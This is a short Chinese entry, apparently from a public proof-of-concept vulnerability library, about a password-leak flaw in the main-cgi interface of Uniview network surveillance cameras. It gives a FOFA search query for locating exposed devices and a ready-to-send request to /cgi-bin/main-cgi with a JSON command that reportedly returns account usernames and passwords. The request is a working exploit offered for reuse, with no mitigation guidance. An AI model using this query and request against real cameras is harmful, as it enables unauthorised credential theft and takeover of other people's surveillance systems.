---
fofa: "app="
source: "wy876 漏洞文库"
---

# 浙江宇视科技视频监控main-cgi密码泄露漏洞

### 一、漏洞描述
<font style="color:rgb(62, 62, 62);">宇视(Uniview)高清网络摄像机是一种高性能的网络摄像机，它可以通过网络进行视频传输和监控。该摄像机采用先进的视频技术，具有高清晰度、低照度、宽动态等特点，能够提供高质量的视频图像。该系统main-cgi接口处存在信息泄露漏洞，可以获取账号密码</font>

### 二、影响版本
uniview-视频监控

### 三、资产测绘
fofa：app="uniview-视频监控"

特征：


### 四、漏洞复现
```plain
/cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bky3gsuwp052gmtn>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
